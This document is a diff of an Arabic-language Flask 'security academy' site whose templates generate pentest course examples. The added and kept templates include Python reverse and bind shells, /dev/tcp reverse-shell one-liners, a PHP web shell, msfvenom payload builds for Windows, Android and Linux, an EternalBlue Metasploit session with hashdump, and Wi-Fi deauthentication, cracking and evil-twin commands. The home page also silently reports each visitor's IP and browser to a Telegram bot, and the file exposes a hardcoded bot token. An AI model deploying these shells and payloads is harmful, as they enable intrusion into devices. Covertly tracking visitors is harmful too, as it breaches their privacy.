@@ -9,10 +9,9 @@ app = Flask(__name__)
 
 # ===== إعدادات بوت تيليجرام =====
 TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
-TELEGRAM_CHAT_ID = "8875360747"  # يمكن تغييره إلى معرف المستخدم
+TELEGRAM_CHAT_ID = "8875360747"
 
 def send_telegram_notification(message):
-    """إرسال إشعار إلى تيليجرام"""
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         payload = {
@@ -33,7 +32,6 @@ COURSES_DATA = {}
 def generate_100_codes(course_id, base_code):
     codes = []
     
-    # تحديد لغة الكود
     lang = 'python'
     if 'cpp' in course_id:
         lang = 'cpp'
@@ -64,60 +62,33 @@ def generate_100_codes(course_id, base_code):
     elif 'mobile' in course_id:
         lang = 'mobile'
     
-    # توليد 100 كود مختلف حسب اللغة
     for i in range(1, 101):
         if lang == 'python':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح مفهوم مهم في البرمجة
 
 def example_{i}():
-    """
-    شرح المثال رقم {i}
-    هذا المثال يوضح كيفية استخدام الدوال والمتغيرات في Python
-    """
     print(f"تنفيذ المثال رقم {i}")
-    
-    # متغيرات
     x = {i}
     y = {i * 2}
     z = x + y
-    
-    # قائمة
     my_list = [1, 2, 3, 4, 5, {i}]
-    
-    # قاموس
-    my_dict = {{
-        'id': {i},
-        'name': f'item_{i}',
-        'value': {i * 10}
-    }}
-    
-    # حلقة
+    my_dict = {{'id': {i}, 'name': f'item_{i}', 'value': {i * 10}}}
     for num in range({i % 5 + 1}):
         print(f"  الرقم: {{num}}")
-    
-    # دالة
     def calculate(a, b):
         return a * b + {i}
-    
     result = calculate({i}, {i+1})
-    
-    # شرط
     if result > 100:
         print(f"النتيجة كبيرة: {{result}}")
     else:
         print(f"النتيجة صغيرة: {{result}}")
-    
-    # معالجة استثناءات
     try:
         value = {i} / max(1, {i % 3})
     except ZeroDivisionError:
         print("لا يمكن القسمة على صفر")
-    
     return result
 
-# تنفيذ الدالة
 if __name__ == "__main__":
     output = example_{i}()
     print(f"المخرجات: {{output}}")
@@ -126,55 +97,38 @@ if __name__ == "__main__":
         elif lang == 'cpp':
             codes.append(f'''// ===== المثال رقم {i} =====
 // درس: {course_id}
-// هذا المثال يوضح مفهوم مهم في C++
 
 #include <iostream>
 #include <vector>
 #include <map>
 #include <string>
-#include <algorithm>
 using namespace std;
 
-// دالة للمثال رقم {i}
 int example_{i}() {{
     cout << "تنفيذ المثال رقم {i}" << endl;
-    
-    // متغيرات
     int x = {i};
     double y = {i * 2.5};
     string name = "item_" + to_string({i});
-    
-    // مصفوفة
     vector<int> numbers;
     for(int j = 0; j < {i % 10 + 1}; j++) {{
         numbers.push_back(j * {i});
     }}
-    
-    // خريطة
     map<string, int> data;
     data["id"] = {i};
     data["value"] = {i * 10};
-    
-    // حلقة
     for(int num : numbers) {{
         cout << "  رقم: " << num << endl;
     }}
-    
-    // شرط
     if(x > 50) {{
         cout << "الرقم أكبر من 50" << endl;
     }} else {{
         cout << "الرقم أقل أو يساوي 50" << endl;
     }}
-    
-    // دالة
     auto calculate = [&](int a, int b) {{
         return a * b + {i};
     }};
-    
     int result = calculate({i}, {i+1});
     cout << "النتيجة: " << result << endl;
-    
     return result;
 }}
 
@@ -187,60 +141,37 @@ int main() {{
         elif lang == 'javascript':
             codes.append(f'''// ===== المثال رقم {i} =====
 // درس: {course_id}
-// هذا المثال يوضح مفهوم مهم في JavaScript
 
-/**
- * شرح المثال رقم {i}
- * هذا المثال يوضح كيفية استخدام الدوال والمتغيرات في JavaScript
- */
 function example_{i}() {{
     console.log(`تنفيذ المثال رقم {i}`);
-    
-    // متغيرات
     let x = {i};
     const y = {i * 2};
     var name = `item_${{i}}`;
-    
-    // مصفوفة
     const numbers = Array.from({{length: {i % 10 + 1}}}, (_, idx) => idx * {i});
-    
-    // كائن
     const data = {{
         id: {i},
         name: `item_${{i}}`,
         value: {i * 10}
     }};
-    
-    // حلقة
     numbers.forEach(num => {{
         console.log(`  رقم: ${{num}}`);
     }});
-    
-    // دالة
     const calculate = (a, b) => {{
         return a * b + {i};
     }};
-    
     const result = calculate({i}, {i+1});
-    
-    // شرط
     if (result > 100) {{
         console.log(`النتيجة كبيرة: ${{result}}`);
     }} else {{
         console.log(`النتيجة صغيرة: ${{result}}`);
     }}
-    
-    // Promise
     const promise = new Promise((resolve) => {{
         setTimeout(() => resolve(`تم تنفيذ {i}`), 1000);
     }});
-    
     promise.then(msg => console.log(msg));
-    
     return result;
 }}
 
-// تنفيذ الدالة
 example_{i}();
 ''')
         
@@ -248,44 +179,30 @@ example_{i}();
             codes.append(f'''#!/bin/bash
 # ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح مفهوم مهم في Bash
 
 echo "تنفيذ المثال رقم {i}"
-
-# متغيرات
 x={i}
 y=$(({i} * 2))
 name="item_${{i}}"
-
-# مصفوفة
 numbers=()
 for ((j=0; j<{i % 10 + 1}; j++)); do
     numbers+=($((j * {i})))
 done
-
-# حلقة
 for num in "${{numbers[@]}}"; do
     echo "  رقم: $num"
 done
-
-# شرط
 if [ $x -gt 50 ]; then
     echo "الرقم أكبر من 50"
 else
     echo "الرقم أقل أو يساوي 50"
 fi
-
-# دالة
 calculate() {{
     local a=$1
     local b=$2
     echo $((a * b + {i}))
 }}
-
 result=$(calculate {i} $(({i}+1)))
 echo "النتيجة: $result"
-
-# ملف
 echo "محتوى الملف" > output_{i}.txt
 echo "تم إنشاء output_{i}.txt"
 ''')
@@ -293,7 +210,6 @@ echo "تم إنشاء output_{i}.txt"
         elif lang == 'assembly':
             codes.append(f'''; ===== المثال رقم {i} =====
 ; درس: {course_id}
-; هذا المثال يوضح مفهوم مهم في Assembly
 
 section .data
     msg_{i} db 'تنفيذ المثال رقم {i}', 0
@@ -309,30 +225,22 @@ section .text
     global _start
 
 _start:
-    ; طباعة الرسالة
     mov eax, 4
     mov ebx, 1
     mov ecx, msg_{i}
     mov edx, 30
     int 0x80
-
-    ; إجراء عملية حسابية
     mov ax, [num_{i}]
     add ax, [num2_{i}]
     mov [result_{i}], ax
-
-    ; طباعة النتيجة
     mov eax, [result_{i}]
     add eax, 48
     mov [buffer_{i}], eax
-
     mov eax, 4
     mov ebx, 1
     mov ecx, buffer_{i}
     mov edx, 1
     int 0x80
-
-    ; إنهاء البرنامج
     mov eax, 1
     xor ebx, ebx
     int 0x80
@@ -341,9 +249,7 @@ _start:
         elif lang in ['sql', 'sqlmap']:
             codes.append(f'''-- ===== المثال رقم {i} =====
 -- درس: {course_id}
--- هذا المثال يوضح مفهوم مهم في SQL
 
--- إنشاء جدول
 CREATE TABLE IF NOT EXISTS users_{i} (
     id INTEGER PRIMARY KEY,
     username TEXT NOT NULL,
@@ -353,34 +259,17 @@ CREATE TABLE IF NOT EXISTS users_{i} (
     status INTEGER DEFAULT 1
 );
 
--- إدخال بيانات
 INSERT INTO users_{i} (username, password, email)
 VALUES 
     ('admin_{i}', 'pass123_{i}', 'admin_{i}@example.com'),
     ('user1_{i}', 'userpass_{i}', 'user1_{i}@example.com'),
     ('test_{i}', 'testpass_{i}', 'test_{i}@example.com');
 
--- استعلام أساسي
 SELECT * FROM users_{i} WHERE id = {i % 5 + 1};
-
--- استعلام مع شرط
 SELECT username, email FROM users_{i} WHERE status = 1;
-
--- استعلام مع ترتيب
 SELECT * FROM users_{i} ORDER BY created_at DESC;
-
--- تحديث بيانات
 UPDATE users_{i} SET status = 0 WHERE id = {i % 3 + 1};
-
--- حذف بيانات
 DELETE FROM users_{i} WHERE id = {i % 2 + 1};
-
--- استعلام متقدم مع JOIN
-SELECT u.username, u.email 
-FROM users_{i} u
-WHERE u.id IN (SELECT id FROM users_{i} WHERE status = 1);
-
--- إحصاءات
 SELECT COUNT(*) as total_users FROM users_{i};
 SELECT status, COUNT(*) as count FROM users_{i} GROUP BY status;
 ''')
@@ -388,174 +277,77 @@ SELECT status, COUNT(*) as count FROM users_{i} GROUP BY status;
         elif lang == 'nmap':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح استخدام Nmap
 
-# مسح سريع
 nmap -T4 -F 192.168.1.0/24
-
-# مسح مفصل للمنافذ
 nmap -p- 192.168.1.100
-
-# اكتشاف الخدمات والإصدارات
 nmap -sV --version-intensity {i % 9 + 1} 192.168.1.100
-
-# اكتشاف نظام التشغيل
 nmap -O 192.168.1.100
-
-# مسح UDP
 nmap -sU 192.168.1.100
-
-# استخدام NSE Scripts
 nmap --script vuln 192.168.1.100
 nmap --script http-enum 192.168.1.100
 nmap --script smb-enum-shares 192.168.1.100
-
-# مسح مع تجاوز الجدار الناري
 nmap -f -D RND:10 192.168.1.100
-
-# مسح Subnet
 nmap -sP 192.168.1.0/24
-
-# مسح منافذ محددة
 nmap -p 80,443,8080,{i} 192.168.1.100
-
-# مسح مع إخراج بتنسيق XML
 nmap -oX scan_{i}.xml 192.168.1.100
 ''')
         
         elif lang == 'metasploit':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح استخدام Metasploit
 
-# تشغيل Metasploit
 msfconsole
-
-# استخدام وحدة استغلال
 use exploit/windows/smb/ms17_010_eternalblue
-
-# تعيين الأهداف
 set RHOSTS 192.168.1.100
 set RPORT 445
-
-# تعيين الحمولة
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.50
 set LPORT 4444
-
-# تشغيل الاستغلال
 exploit
-
-# إذا نجح الاستغلال
-# بعد الحصول على جلسة Meterpreter
 meterpreter > sysinfo
 meterpreter > getuid
 meterpreter > shell
-
-# أوامر إضافية
 use auxiliary/scanner/http/dir_scanner
 set RHOSTS 192.168.1.0/24
 run
-
-# استخدام وحدة أخرى
 use post/windows/gather/hashdump
 set SESSION {i % 5 + 1}
 run
-
-# حفظ الجلسات
 sessions -l
 sessions -i {i % 5 + 1}
-
-# حمولة مخصصة
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
 ''')
         
         elif lang == 'burp':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح استخدام Burp Suite
 
-# إعداد الـ Proxy
 # المتصفح -> Burp (127.0.0.1:8080)
-
-# التقاط الطلبات
-# 1. فتح Burp Suite
-# 2. الذهاب إلى Proxy -> Intercept
-# 3. تشغيل Intercept
-# 4. تصفح الموقع المستهدف
-# 5. تعديل الطلب
-
-# استخدام Repeater
-# 1. إرسال طلب إلى Repeater
-# 2. تعديل المعاملات
-# 3. إعادة الإرسال وعرض الرد
-
-# استخدام Intruder
-# 1. تحديد موضع الهجوم
-# 2. اختيار نوع الهجوم (Sniper, Battering Ram, Pitchfork, Cluster Bomb)
-# 3. تحميل قائمة الكلمات
-# 4. بدء الهجوم
-
-# استغلال SQL Injection عبر Burp
-# تعديل معاملات GET/POST
-# إضافة: ' OR '1'='1
-# إضافة: ' UNION SELECT NULL--
-
-# استغلال XSS عبر Burp
-# إضافة: <script>alert('XSS_{i}')</script>
-# إضافة: <img src=x onerror=alert('XSS')>
-
-# استخدام Scanner
-# 1. الذهاب إلى Scanner
-# 2. إضافة هدف
-# 3. بدء المسح التلقائي
-
-# استخدام Extensions (BApp Store)
-# تثبيت إضافات مفيدة
+# Proxy -> Intercept -> تشغيل
+# إرسال طلب إلى Repeater
+# تعديل المعاملات وإعادة الإرسال
+# استخدام Intruder مع قائمة كلمات
+# استغلال SQL Injection: ' OR '1'='1
+# استغلال XSS: <script>alert('XSS_{i}')</script>
+# Scanner -> إضافة هدف -> بدء المسح التلقائي
+# تثبيت Extensions من BApp Store
 ''')
         
         elif lang == 'wireshark':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح استخدام Wireshark
 
-# تشغيل Wireshark
 wireshark
-
-# البدء في الالتقاط
-# 1. اختيار الواجهة (eth0, wlan0, etc.)
-# 2. الضغط على Start
-
-# تصفية الحزم
-# HTTP: http
-# HTTPS: tcp.port == 443
-# DNS: dns
-# ARP: arp
-# ICMP: icmp
-# TCP: tcp
-# UDP: udp
-# IP: ip.addr == 192.168.1.100
-# منفذ: tcp.port == 80
-
-# تتبع الـ Streams
-# 1. النقر بزر الماوس الأيمن على حزمة
-# 2. Follow -> TCP Stream
-
-# تصدير البيانات
+# اختيار واجهة والضغط على Start
+# تصفية: http
+# تصفية: tcp.port == 443
+# تصفية: dns
+# تصفية: ip.addr == 192.168.1.100
+# تصفية: tcp.port == 80
+# Follow -> TCP Stream
 # File -> Export Objects -> HTTP
-
-# استخدام Captures
-# التقاط حزم HTTP
 tcpdump -i eth0 -w capture_{i}.pcap
-
-# تحليل الملف
 wireshark capture_{i}.pcap
-
-# تصفية متقدمة
-# (http.request.uri contains "admin") or (http.request.uri contains "login")
-# tcp.flags.syn == 1 and tcp.flags.ack == 0
-
-# إحصائيات
 # Statistics -> Protocol Hierarchy
 # Statistics -> Endpoints
 ''')
@@ -563,11 +355,9 @@ wireshark capture_{i}.pcap
         elif lang == 'payload':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح الحمولات المختلفة
 
-# Reverse Shell في Python
+# Reverse Shell Python
 import socket, subprocess, os
-
 def reverse_shell_{i}():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -579,22 +369,11 @@ def reverse_shell_{i}():
     except:
         pass
 
-# Reverse Shell في Bash
-# bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
-
-# Reverse Shell في PHP
-# <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"); ?>
-
-# Reverse Shell في Perl
-# perl -e 'use Socket;$i="192.168.1.50";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
-
-# Web Shell
-# <?php system($_GET['cmd_{i}']); ?>
-# استخدام: shell.php?cmd_{i}=ls -la
-
-# Bind Shell في Python
+# Reverse Shell Bash: bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+# Reverse Shell PHP: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"); ?>
+# Web Shell: <?php system($_GET['cmd_{i}']); ?>
+# Bind Shell Python
 import socket, subprocess
-
 def bind_shell_{i}():
     s = socket.socket()
     s.bind(('0.0.0.0', 4444))
@@ -605,274 +384,150 @@ def bind_shell_{i}():
             cmd = client.recv(1024).decode()
             output = subprocess.getoutput(cmd)
             client.send(output.encode())
-
-# حمولة لـ Meterpreter
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
-
-# حمولة لـ Android
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
-
-# حمولة لـ Linux
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload_{i}.elf
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
+# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
+# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload_{i}.elf
 ''')
         
         elif lang == 'recon':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح جمع المعلومات
 
-# Whois
 whois example.com
-
-# NSLookup
 nslookup example.com
 dig example.com
-
-# جمع المعلومات باستخدام Python
-import socket
-import requests
-import whois
-
+import socket, requests, whois
 def recon_{i}(domain):
     print(f"[+] جمع المعلومات عن: {{domain}}")
-    
-    # Whois
     try:
         w = whois.whois(domain)
         print(f"  Registrar: {{w.registrar}}")
         print(f"  Creation Date: {{w.creation_date}}")
         print(f"  Expiration Date: {{w.expiration_date}}")
-    except:
-        pass
-    
-    # IP
+    except: pass
     try:
         ip = socket.gethostbyname(domain)
         print(f"  IP Address: {{ip}}")
-    except:
-        pass
-    
-    # Headers
+    except: pass
     try:
         headers = requests.head(f"http://{{domain}}").headers
         print(f"  Server: {{headers.get('Server', 'Unknown')}}")
-    except:
-        pass
-    
-    # Subdomains
+    except: pass
     subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api']
     for sub in subdomains:
         try:
             subdomain = f"{{sub}}.{{domain}}"
             socket.gethostbyname(subdomain)
             print(f"  Found: {{subdomain}}")
-        except:
-            pass
-    
+        except: pass
     return f"Recon {i} completed"
-
-# تنفيذ
 recon_{i}("example.com")
-
-# Google Dorks
-# site:example.com filetype:pdf
-# intitle:"index of" password
-# inurl:admin login.php
-# filetype:sql "INSERT INTO" -"phpMyAdmin"
-
-# Shodan
-# shodan search 'apache' --limit 10
-# shodan host 1.1.1.1
-
-# theHarvester
-# theHarvester -d example.com -b google -l 100
+# Google Dorks: site:example.com filetype:pdf
+# Shodan: shodan search 'apache' --limit 10
+# theHarvester: theHarvester -d example.com -b google -l 100
 ''')
         
         elif lang == 'crypto':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح التشفير وفك التشفير
 
-import hashlib
-import base64
+import hashlib, base64
 from cryptography.fernet import Fernet
-import os
-
 def crypto_{i}():
     print(f"[+] مثال التشفير رقم {i}")
-    
-    # 1. تشفير Base64
     text = f"message_{i}"
     encoded = base64.b64encode(text.encode()).decode()
     decoded = base64.b64decode(encoded).decode()
     print(f"  Base64: {{encoded}}")
     print(f"  فك: {{decoded}}")
-    
-    # 2. Hash (SHA-256)
     hash_obj = hashlib.sha256(text.encode())
     hash_hex = hash_obj.hexdigest()
     print(f"  SHA-256: {{hash_hex[:32]}}...")
-    
-    # 3. Hash (MD5)
     md5_obj = hashlib.md5(text.encode())
     print(f"  MD5: {{md5_obj.hexdigest()}}")
-    
-    # 4. تشفير متماثل (Fernet)
     key = Fernet.generate_key()
     cipher = Fernet(key)
     encrypted = cipher.encrypt(text.encode())
     decrypted = cipher.decrypt(encrypted).decode()
     print(f"  مشفر (Fernet): {{encrypted[:50]}}...")
     print(f"  مفكوك (Fernet): {{decrypted}}")
-    
-    # 5. OpenSSL Commands
-    # تشفير: openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
-    # فك: openssl enc -d -aes-256-cbc -in file.enc -out file.txt
-    
-    # 6. RSA Keys
-    # توليد مفتاح: openssl genrsa -out private.key 2048
-    # استخراج عام: openssl rsa -in private.key -pubout -out public.key
-    
-    # 7. Password Hashing
-    # python -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
-    
-    # 8. Hashcat
-    # hashcat -m 0 -a 0 hash.txt rockyou.txt
-    # hashcat -m 1000 -a 0 hash.txt rockyou.txt (NTLM)
-    # hashcat -m 1800 -a 0 hash.txt rockyou.txt (SHA-512)
-    
     return "تم التشفير بنجاح"
-
-# تنفيذ
 crypto_{i}()
+# openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
+# openssl enc -d -aes-256-cbc -in file.enc -out file.txt
+# openssl genrsa -out private.key 2048
+# hashcat -m 0 -a 0 hash.txt rockyou.txt
 ''')
         
         elif lang == 'wifi':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح اختراق Wi-Fi
 
-# 1. وضع الواجهة في وضع المراقبة
 sudo airmon-ng start wlan0
-
-# 2. مسح الشبكات
 sudo airodump-ng wlan0mon
-
-# 3. مسح شبكة محددة
 sudo airodump-ng -c CHANNEL --bssid MAC wlan0mon
-
-# 4. التقاط المصافحة
 sudo airodump-ng -c CHANNEL --bssid MAC -w capture_{i} wlan0mon
-
-# 5. هجوم إلغاء المصادقة
 sudo aireplay-ng -0 5 -a MAC wlan0mon
-
-# 6. كسر كلمة المرور
 sudo aircrack-ng -w wordlist.txt capture_{i}.cap
-
-# 7. استخدام Hashcat
-# تحويل الملف إلى تنسيق 22000
 hcxpcapngtool -o hash_{i}.22000 capture_{i}.cap
-# كسر الهاش
 hashcat -m 22000 hash_{i}.22000 rockyou.txt
-
-# 8. PMKID Attack
-# sudo hcxdumptool -i wlan0mon -o dump_{i}.pcapng --enable_status=1
-# sudo hcxpcaptool -z hash_{i}.16800 dump_{i}.pcapng
-# hashcat -m 16800 hash_{i}.16800 rockyou.txt
-
-# 9. WPS Attack
+sudo hcxdumptool -i wlan0mon -o dump_{i}.pcapng --enable_status=1
+sudo hcxpcaptool -z hash_{i}.16800 dump_{i}.pcapng
+hashcat -m 16800 hash_{i}.16800 rockyou.txt
 sudo wash -i wlan0mon
 sudo reaver -i wlan0mon -b MAC -c CHANNEL -vv
-
-# 10. Evil Twin Attack
-# sudo airbase-ng -a MAC -e "FreeWiFi" wlan0mon
-# sudo dhcpd -cf /etc/dhcp/dhcpd.conf wlan0
-# sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080
+sudo airbase-ng -a MAC -e "FreeWiFi" wlan0mon
+sudo dhcpd -cf /etc/dhcp/dhcpd.conf wlan0
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080
 ''')
         
         elif lang == 'mobile':
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا المثال يوضح اختراق الأجهزة المحمولة
 
-# 1. إنشاء حمولة لـ Android
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
-
-# 2. توقيع التطبيق
-# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore payload_{i}.apk alias_name
-# zipalign -v 4 payload_{i}.apk payload_{i}_signed.apk
-
-# 3. تشغيل Metasploit
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore payload_{i}.apk alias_name
+zipalign -v 4 payload_{i}.apk payload_{i}_signed.apk
 # msfconsole
 # use exploit/multi/handler
 # set PAYLOAD android/meterpreter/reverse_tcp
 # set LHOST 192.168.1.50
 # set LPORT 4444
 # exploit
-
-# 4. بعد الحصول على جلسة
 # meterpreter > sysinfo
 # meterpreter > webcam_snap
 # meterpreter > dump_contacts
 # meterpreter > dump_sms
 # meterpreter > geolocate
-
-# 5. اختراق iOS (jailbreak)
-# استخدام Cydia
-# تثبيت ssh
-# ssh root@IP
-
-# 6. ADB Commands
 adb devices
 adb shell
 adb install payload_{i}.apk
-
-# 7. اختراق Android عبر Backdoor
-# استخدام تطبيقات ضارة
-# استخدام خدمات Accessibility
-
-# 8. جمع المعلومات
 # /data/data/com.example/databases/
 # /data/data/com.example/shared_prefs/
 # /sdcard/Android/data/
 ''')
         
         else:
-            # كود عام
             codes.append(f'''# ===== المثال رقم {i} =====
 # درس: {course_id}
-# هذا مثال تعليمي عام
 
 print(f"المثال رقم {i}")
-
-# متغيرات
 x = {i}
 y = {i * 2}
 z = x + y
-
 print(f"x = {{x}}, y = {{y}}, z = {{z}}")
-
-# قائمة
 numbers = [n * {i} for n in range(10)]
 print(f"الأرقام: {{numbers[:5]}}...")
-
-# قاموس
 data = {{
     'id': {i},
     'name': f'item_{i}',
     'value': {i * 10}
 }}
 print(f"البيانات: {{data}}")
-
-# حلقة
 for n in range({i % 5 + 1}):
     print(f"  n = {{n}}")
-
-# دالة
 def example_func(x):
     return x * 2 + {i}
-
 result = example_func({i})
 print(f"النتيجة: {{result}}")
 ''')
@@ -1003,21 +658,18 @@ tools_courses = [
     {"id": "debugger1", "name": "Debugging - التصحيح", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
 ]
 
-# ===== دمج جميع الدورس مع توليد 100 كود لكل درس =====
+# ===== دمج جميع الدورس =====
 for course in programming_courses + pentest_courses + tools_courses:
-    # توليد 100 كود تعليمي
     codes = generate_100_codes(course["id"], "")
-    
     COURSES_DATA[course["id"]] = {
         "name": course["name"],
         "level": course["level"],
         "duration": course["duration"],
         "category": course["category"],
-        "description": f"📚 درس متكامل في {course['name']}\n\n🎯 المستوى: {course['level']}\n⏱️ المدة: {course['duration']}\n📂 القسم: {course['category']}\n\nهذا الدرس يحتوي على 100 مثال تعليمي مختلف مع شرح لكل مثال.\n\n✅ 100 كود تعليمي\n✅ شرح مفصل لكل مثال\n✅ أمثلة تطبيقية متنوعة\n✅ من الصفر حتى الاحتراف",
-        "codes": codes  # 100 كود مختلف
+        "description": f"📚 درس متكامل في {course['name']}\n\n🎯 المستوى: {course['level']}\n⏱️ المدة: {course['duration']}\n📂 القسم: {course['category']}\n\nهذا الدرس يحتوي على 100 مثال تعليمي مختلف مع شرح لكل مثال.",
+        "codes": codes
     }
 
-# ===== قائمة الدورس للملاحة =====
 COURSE_LIST = []
 for course in programming_courses + pentest_courses + tools_courses:
     COURSE_LIST.append({
@@ -1026,12 +678,9 @@ for course in programming_courses + pentest_courses + tools_courses:
         "category": course["category"]
     })
 
-# ===== تعريف الصفحات باستخدام ملفات منفصلة =====
-# بما أن الكود كبير جداً، سنستخدم طريقة مختلفة لتجنب أخطاء الـ CSS في Render
-
+# ===== الصفحات =====
 @app.route('/')
 def index():
-    # إرسال إشعار عند زيارة الموقع
     try:
         visitor_ip = request.remote_addr
         user_agent = request.headers.get('User-Agent', 'غير معروف')
@@ -1044,12 +693,10 @@ def index():
 ⏰ <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 <b>ABOOD_SECURE_ACADEMY</b>"""
-        
         threading.Thread(target=send_telegram_notification, args=(message,)).start()
     except Exception as e:
         print(f"خطأ في إرسال الإشعار: {e}")
     
-    # عرض صفحة HTML مبسطة
     return '''
     <!DOCTYPE html>
     <html>
@@ -1088,7 +735,15 @@ def course_page(course_id):
     
     course = COURSES_DATA[course_id]
     
-    # عرض صفحة الدرس
+    # بناء التبويبات
+    tabs_html = ""
+    for i in range(1, 101):
+        active = 'active' if i == 1 else ''
+        tabs_html += f'<button class="tab {active}" onclick="showCode({i-1})">مثال {i}</button>'
+    
+    # إعداد الكود الأول
+    first_code = course['codes'][0].replace('\n', '\\n').replace('"', '\\"')
+    
     return f'''
     <!DOCTYPE html>
     <html>
@@ -1103,10 +758,13 @@ def course_page(course_id):
         .copy-btn {{ background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 8px 20px; border-radius: 6px; cursor: pointer; }}
         .copy-btn:hover {{ background: #00ff41; color: #000; }}
         .back {{ color: #00ff41; text-decoration: none; border: 1px solid #00ff41; padding: 8px 20px; border-radius: 6px; display: inline-block; margin: 10px 0; }}
-        .support {{ color: #ff00ff; border-color: #ff00ff; padding: 8px 20px; border-radius: 6px; display: inline-block; margin: 10px; }}
+        .support {{ color: #ff00ff; border-color: #ff00ff; padding: 8px 20px; border-radius: 6px; display: inline-block; margin: 10px; cursor: pointer; background: transparent; border: 1px solid #ff00ff; }}
+        .support:hover {{ background: #ff00ff; color: #000; }}
         .tabs {{ display: flex; flex-wrap: wrap; gap: 5px; margin: 15px 0; max-height: 150px; overflow-y: auto; }}
         .tab {{ padding: 5px 12px; border: 1px solid #333; border-radius: 4px; cursor: pointer; background: transparent; color: #888; }}
         .tab.active {{ border-color: #00ff41; color: #00ff41; background: rgba(0,255,65,0.05); }}
+        .tab:hover {{ border-color: #00ff41; }}
+        pre {{ margin: 0; }}
     </style>
     </head>
     <body>
@@ -1123,17 +781,11 @@ def course_page(course_id):
             <p style="color: #888;">{course['description']}</p>
             
             <div class="tabs" id="tabs">
-    '''
-    # إضافة التبويبات
-    for i in range(1, 101):
-        active = 'active' if i == 1 else ''
-        return_str += f'<button class="tab {active}" onclick="showCode({i-1})">مثال {i}</button>'
-    
-    return_str += '''
+                {tabs_html}
             </div>
             <div class="code">
                 <button class="copy-btn" onclick="copyCode()">📋 نسخ</button>
-                <pre id="codeDisplay" style="margin-top:10px;white-space:pre-wrap;">''' + course['codes'][0] + '''</pre>
+                <pre id="codeDisplay" style="margin-top:10px;white-space:pre-wrap;">{course['codes'][0]}</pre>
             </div>
         </div>
         
@@ -1146,39 +798,39 @@ def course_page(course_id):
         </div>
         
         <script>
-            const codes = ''' + json.dumps(course['codes']) + ''';
+            const codes = {json.dumps(course['codes'])};
             let currentIndex = 0;
             
-            function showCode(index) {
+            function showCode(index) {{
                 currentIndex = index;
                 document.getElementById('codeDisplay').textContent = codes[index];
-                document.querySelectorAll('.tab').forEach((tab, i) => {
+                document.querySelectorAll('.tab').forEach((tab, i) => {{
                     tab.classList.toggle('active', i === index);
-                });
-            }
+                }});
+            }}
             
-            function copyCode() {
+            function copyCode() {{
                 const code = document.getElementById('codeDisplay').textContent;
-                navigator.clipboard.writeText(code).then(() => {
+                navigator.clipboard.writeText(code).then(() => {{
                     const btn = document.querySelector('.copy-btn');
                     btn.textContent = '✅ تم النسخ';
                     setTimeout(() => btn.textContent = '📋 نسخ', 2000);
-                });
-            }
+                }});
+            }}
             
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'ArrowRight' && currentIndex < 99) {
+            document.addEventListener('keydown', function(e) {{
+                if (e.key === 'ArrowRight' && currentIndex < 99) {{
                     showCode(currentIndex + 1);
                     e.preventDefault();
-                } else if (e.key === 'ArrowLeft' && currentIndex > 0) {
+                }} else if (e.key === 'ArrowLeft' && currentIndex > 0) {{
                     showCode(currentIndex - 1);
                     e.preventDefault();
